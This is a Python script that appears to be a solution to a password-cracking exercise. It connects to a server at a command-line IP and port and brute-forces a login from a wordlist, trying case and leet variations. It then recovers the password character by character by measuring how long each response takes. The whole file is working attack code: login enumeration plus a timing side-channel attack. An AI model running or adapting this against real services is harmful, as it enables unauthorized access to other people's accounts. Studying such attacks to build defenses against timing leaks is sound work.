import itertools
import json
import socket
import sys
import string

import os
import time

dir_path = os.path.dirname(os.path.realpath(__file__))

args = sys.argv
IP_address = args[1]
port = int(args[2])


def print_result(login, password):
    d = {
        "login": login,
        "password": password
    }
    return print(json.dumps(d))


def prepare_request(login, password):
    d = {
        "login": login,
        "password": password
    }
    return json.dumps(d).encode()


def encode_response(response):
    return json.loads(response.decode())["result"]


def combinations_generator(case):
    leet = {33: '!', 34: '"', 35: '#', 36: '$', 37: '%', 38: '&', 39: "'", 40: '(', 41: ')', 42: '*', 43: '+', 44: ',',
            45: '-', 46: '.', 47: '/', 48: '0', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5', 54: '6', 55: '7', 56: '8',
            57: '9', 58: ':', 59: ';', 60: '<', 61: '=', 62: '>', 63: '?', 64: '@', 91: '[',
            92: '\\', 93: ']', 94: '^', 95: '_', 96: '`', 123: '{', 124: '|', 125: '}', 126: '~',
            65: "Aa@", 66: "Bb", 67: "Cc", 68: "Dd", 69: 'Ee', 70: 'Ff', 71: 'Gg', 72: 'Hh', 73: 'Ii', 74: 'Jj',
            75: 'Kk', 76: 'Ll',
            77: 'Mm', 78: 'Nn', 79: 'Oo0', 80: 'Pp', 81: 'Qq', 82: 'Rr5', 83: 'Ss', 84: 'Tt', 85: 'Uu', 86: 'Vv',
            87: 'Ww', 88: 'Xx',
            89: 'Yy', 90: 'Zx'}

    for letters in itertools.product(*[leet[ord(el.upper())] for el in case]):
        yield "".join(letters)


logins_generator = itertools.chain.from_iterable(
    combinations_generator(line[:-1]) for line in open(f"{dir_path}/logins.txt", "r"))


def passwords_generator(first_letters=""):
    for char in string.printable:
        yield first_letters + char


with socket.socket() as socket_client:
    socket_client.connect((IP_address, port))
    login = ""
    password = ""
    response = "Wrong login!"

    while response == "Wrong login!":
        login = next(logins_generator)
        socket_client.send(prepare_request(login, password))
        response = encode_response(socket_client.recv(1024))

    gen = passwords_generator()

    while True:
        password = next(gen)
        socket_client.send(prepare_request(login, password))

        start_t = time.perf_counter()
        response = socket_client.recv(1024)
        stop_t = time.perf_counter()
        response = encode_response(response)

        difference_t = (stop_t - start_t)
        if response == "Connection success!":
            print_result(login, password)
            break
        if difference_t > 0.1:
            gen = passwords_generator(password)
